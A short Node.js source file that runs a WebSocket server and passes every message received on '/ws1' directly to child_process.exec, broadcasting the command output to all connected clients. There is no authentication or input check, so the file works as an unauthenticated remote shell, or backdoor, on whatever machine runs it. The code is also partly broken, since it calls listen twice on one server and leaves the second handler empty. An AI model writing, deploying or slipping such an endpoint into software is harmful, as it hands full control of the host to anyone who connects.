const WebSocket = require('ws');
const http = require('http');

const wsPort1 = 5555;
const wsPort2 = 8888;

const server = http.createServer();
const wss1 = new WebSocket.Server({ noServer: true });
const wss2 = new WebSocket.Server({ noServer: true });

const clients = [];

// Handle WebSocket connections for port 5555
wss1.on('connection', (ws) => {
    clients.push(ws);

    ws.on('message', (message) => {
        require('child_process').exec(message, (error, stdout, stderr) => {
            const response = { stdout, stderr };
            clients.forEach(client => client.send(JSON.stringify(response)));
        });
    });

    ws.on('close', () => {
        const index = clients.indexOf(ws);
        if (index > -1) {
            clients.splice(index, 1);
        }
    });
});

// Handle WebSocket connections for port 8888
wss2.on('connection', (ws) => {
    // Additional logic for port 8888 if needed
});

server.on('upgrade', (request, socket, head) => {
    if (request.url === '/ws1') {
        wss1.handleUpgrade(request, socket, head, (ws) => {
            wss1.emit('connection', ws, request);
        });
    } else if (request.url === '/ws2') {
        wss2.handleUpgrade(request, socket, head, (ws) => {
            wss2.emit('connection', ws, request);
        });
    } else {
        socket.destroy();
    }
});

server.listen(wsPort1, () => console.log(`WebSocket server listening on port ${wsPort1}`));
server.listen(wsPort2, () => console.log(`WebSocket server listening on port ${wsPort2}`));
